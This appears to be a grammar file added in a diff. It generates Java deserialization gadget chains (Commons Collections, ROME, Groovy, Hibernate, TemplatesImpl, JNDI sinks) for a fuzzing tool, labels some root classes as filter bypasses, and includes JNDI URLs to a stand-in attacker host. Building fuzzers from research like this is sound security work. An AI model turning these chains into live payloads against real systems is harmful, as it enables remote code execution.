@@ -1,0 +1,187 @@
+# =============================================================================
+# Java Deserialization Gadget Chain Grammar — IR (Intermediate Representation)
+# Generates JSON IR for Java gadget chains. DeserTarget compiles these into
+# real serialized object streams for differential deserialization fuzzing.
+#
+# Expanded with JDD (IEEE S&P 2024), FLASH, GCMiner findings:
+#   - Filter-bypass entries: ConcurrentHashMap, TreeSet, TreeBag, BadAttrValExp
+#   - JNDI sinks: JdbcRowSetImpl, InitialContext.doLookup
+#   - Library-specific links: ROME, Groovy, Hibernate, Vaadin, Click, BeanShell
+# =============================================================================
+
+!root <ir>
+!max_depth 5
+
+# Full IR object
+<ir> = {"chain_type":<chain_type>,"root_class":<root_class>,"root_trigger":<root_trigger>,"links":[<chain>],"sink_method":<sink_method>}
+
+<chain_type> = "transform_chain"
+<chain_type> = "proxy_chain"
+<chain_type> = "comparator_chain"
+<chain_type> = "hashcode_chain"
+<chain_type> = "bean_chain"
+<chain_type> = "tostring_chain"
+<chain_type> = "closure_chain"
+<chain_type> = "jndi_chain"
+
+# ── Root trigger classes ─────────────────────────────────────────
+# Classic entries (often filtered by JEP 290)
+<root_class> = "java.util.HashMap"
+<root_class> = "java.util.PriorityQueue"
+<root_class> = "java.util.TreeMap"
+<root_class> = "java.util.Hashtable"
+<root_class> = "java.util.HashSet"
+<root_class> = "java.util.LinkedHashSet"
+# Filter-bypass entries (rarely blocked)
+<root_class> = "java.util.concurrent.ConcurrentHashMap"
+<root_class> = "java.util.TreeSet"
+<root_class> = "org.apache.commons.collections4.bag.TreeBag"
+<root_class> = "javax.management.BadAttributeValueExpException"
+
+<root_trigger> = "readObject→hash→hashCode"
+<root_trigger> = "readObject→heapify→comparator.compare"
+<root_trigger> = "readObject→put→comparator.compare"
+<root_trigger> = "readObject→reconstitutionPut→hashCode"
+<root_trigger> = "readObject→HashMap.put→hashCode"
+<root_trigger> = "readObject→putVal→hashCode"
+<root_trigger> = "readObject→TreeMap.put→comparator.compare"
+<root_trigger> = "readObject→val.toString"
+
+# ── Chain (1-6 links) ───────────────────────────────────────────
+<chain> = <link>
+<chain> = <link>,<link>
+<chain> = <link>,<link>,<link>
+<chain> = <link>,<link>,<link>,<link>
+<chain> = <link>,<link>,<link>,<link>,<link>
+<chain> = <link>,<link>,<link>,<link>,<link>,<link>
+
+# ── Link types ──────────────────────────────────────────────────
+<link> = <invoker>
+<link> = <chained>
+<link> = <constant>
+<link> = <comparator>
+<link> = <lazymap>
+<link> = <tiedmap>
+<link> = <handler>
+<link> = <rome_tostring>
+<link> = <rome_objectbean>
+<link> = <groovy_closure>
+<link> = <groovy_gstring>
+<link> = <vaadin_property>
+<link> = <jndi_jdbc>
+<link> = <templates_impl>
+<link> = <hibernate_typed_value>
+<link> = <hibernate_component_type>
+<link> = <hibernate_getter>
+<link> = <rome_equalsbean>
+
+# ── CC3 InvokerTransformer ──────────────────────────────────────
+<invoker> = {"class":"org.apache.commons.collections.functors.InvokerTransformer","field_overrides":{"iMethodName":<method>,"iParamTypes":["[Ljava.lang.String;"],"iArgs":[["id"]]}}
+
+# CC4 InvokerTransformer
+<invoker> = {"class":"org.apache.commons.collections4.functors.InvokerTransformer","field_overrides":{"iMethodName":<method>,"iParamTypes":["[Ljava.lang.String;"],"iArgs":[["id"]]}}
+
+# ── ChainedTransformer ──────────────────────────────────────────
+<chained> = {"class":"org.apache.commons.collections.functors.ChainedTransformer","field_overrides":{"iTransformers":[<constant>,<invoker>]}}
+
+# ── ConstantTransformer ─────────────────────────────────────────
+<constant> = {"class":"org.apache.commons.collections.functors.ConstantTransformer","field_overrides":{"iConstant":"java.lang.Runtime"}}
+<constant> = {"class":"org.apache.commons.collections.functors.ConstantTransformer","field_overrides":{"iConstant":"javax.naming.InitialContext"}}
+<constant> = {"class":"org.apache.commons.collections4.functors.ConstantTransformer","field_overrides":{"iConstant":"java.lang.Runtime"}}
+
+# ── Comparators ─────────────────────────────────────────────────
+# TransformingComparator (CC4)
+<comparator> = {"class":"org.apache.commons.collections4.comparators.TransformingComparator","field_overrides":{"transformer":{"$ref":"link:1"}}}
+
+# BeanComparator (CB1/CB3/CB4)
+<comparator> = {"class":"org.apache.commons.beanutils.BeanComparator","field_overrides":{"property":<bean_property>}}
+
+# ColumnComparator (Click2)
+<comparator> = {"class":"org.apache.click.control.Column$ColumnComparator","field_overrides":{"column":{"name":<bean_property>}}}
+
+# ── Map/Entry gadgets ───────────────────────────────────────────
+# LazyMap
+<lazymap> = {"class":"org.apache.commons.collections.map.LazyMap","field_overrides":{"factory":{"$ref":"link:1"}}}
+<lazymap> = {"class":"org.apache.commons.collections4.map.LazyMap","field_overrides":{"factory":{"$ref":"link:1"}}}
+
+# TiedMapEntry
+<tiedmap> = {"class":"org.apache.commons.collections.keyvalue.TiedMapEntry","field_overrides":{"map":{"$ref":"link:0"},"key":"trigger"}}
+<tiedmap> = {"class":"org.apache.commons.collections4.keyvalue.TiedMapEntry","field_overrides":{"map":{"$ref":"link:0"},"key":"trigger"}}
+
+# ── InvocationHandler proxy ─────────────────────────────────────
+<handler> = {"class":"java.beans.EventHandler","field_overrides":{"target":{"$ref":"link:0"},"action":<method>}}
+<handler> = {"class":"bsh.XThis$Handler","field_overrides":{"target":{"$ref":"link:0"},"action":"compare"}}
+
+# ── ROME gadget links (JDD) ─────────────────────────────────────
+<rome_tostring> = {"class":"com.sun.syndication.feed.impl.ToStringBean","field_overrides":{"_beanClass":<sink_class>,"_obj":{"$ref":"link:1"}}}
+
+<rome_objectbean> = {"class":"com.sun.syndication.feed.impl.ObjectBean","field_overrides":{"_equalsBean":{"$ref":"link:0"},"_toStringBean":{"$ref":"link:1"}}}
+
+# ── Groovy links (JDD: GroovyGStr) ──────────────────────────────
+<groovy_closure> = {"class":"org.codehaus.groovy.runtime.MethodClosure","field_overrides":{"owner":"id","delegate":"id","method":"execute","maximumNumberOfParameters":0,"parameterTypes":[]}}
+
+<groovy_gstring> = {"class":"org.codehaus.groovy.runtime.GStringImpl","field_overrides":{"values":[{"$ref":"link:0"}],"strings":["",""]}}
+
+# ── Vaadin links (JDD: VaadinMP) ────────────────────────────────
+<vaadin_property> = {"class":"com.vaadin.data.util.MethodProperty","field_overrides":{"instance":{"$ref":"link:1"},"getMethodName":"getOutputProperties"}}
+<vaadin_property> = {"class":"com.vaadin.data.util.NestedMethodProperty","field_overrides":{"instance":{"$ref":"link:1"},"propertyName":"outputProperties"}}
+
+# ── Hibernate links (JDD: Hibernate3) ────────────────────────────
+<hibernate_typed_value> = {"class":"org.hibernate.engine.spi.TypedValue","field_overrides":{"type":{"$ref":"link:1"},"value":{"$ref":"link:2"}}}
+
+<hibernate_component_type> = {"class":"org.hibernate.type.ComponentType","field_overrides":{"propertyTypes":[{"$ref":"link:1"}],"propertySpan":1}}
+
+<hibernate_getter> = {"class":"org.hibernate.property.access.spi.GetterMethodImpl","field_overrides":{"containerClass":<sink_class>,"propertyName":<bean_property>}}
+
+# ── ROME EqualsBean (separate link type) ─────────────────────────
+<rome_equalsbean> = {"class":"com.sun.syndication.feed.impl.EqualsBean","field_overrides":{"_beanClass":"com.sun.syndication.feed.impl.ToStringBean","_obj":{"$ref":"link:1"}}}
+
+# ── JNDI sink (no TemplatesImpl, JDK 17+) ───────────────────────
+<jndi_jdbc> = {"class":"com.sun.rowset.JdbcRowSetImpl","field_overrides":{"dataSource":<jndi_url>}}
+
+# ── TemplatesImpl sink (bytecode loading) ────────────────────────
+<templates_impl> = {"class":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","field_overrides":{"_name":"exploit","_class":null,"_bytecodes":null}}
+
+# ── Sink methods ─────────────────────────────────────────────────
+<sink_method> = "Runtime.exec"
+<sink_method> = "ProcessBuilder.start"
+<sink_method> = "Method.invoke"
+<sink_method> = "InitialContext.lookup"
+<sink_method> = "InitialContext.doLookup"
+<sink_method> = "JdbcRowSetImpl.getDatabaseMetaData"
+<sink_method> = "ClassLoader.loadClass"
+<sink_method> = "ScriptEngine.eval"
+<sink_method> = "TemplatesImpl.getOutputProperties"
+<sink_method> = "TemplatesImpl.newTransformer"
+
+# ── Bean properties (for BeanComparator/ColumnComparator) ────────
+<bean_property> = "outputProperties"
+<bean_property> = "databaseMetaData"
+<bean_property> = "connection"
+<bean_property> = "class"
+
+# ── Sink target classes (for ToStringBean._beanClass) ────────────
+<sink_class> = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"
+<sink_class> = "com.sun.rowset.JdbcRowSetImpl"
+
+# ── JNDI URLs ────────────────────────────────────────────────────
+<jndi_url> = "ldap://attacker.example/exploit"
+<jndi_url> = "rmi://attacker.example/exploit"
+<jndi_url> = "dns://attacker.example"
+
+# ── Dangerous method names ───────────────────────────────────────
+<method> = "exec"
+<method> = "start"
+<method> = "invoke"
+<method> = "lookup"
+<method> = "doLookup"
+<method> = "eval"
+<method> = "loadClass"
+<method> = "getRuntime"
+<method> = "newInstance"
+<method> = "forName"
+<method> = "getOutputProperties"
+<method> = "getDatabaseMetaData"
+<method> = "execute"
+<method> = "toString"
+<method> = "getValue"
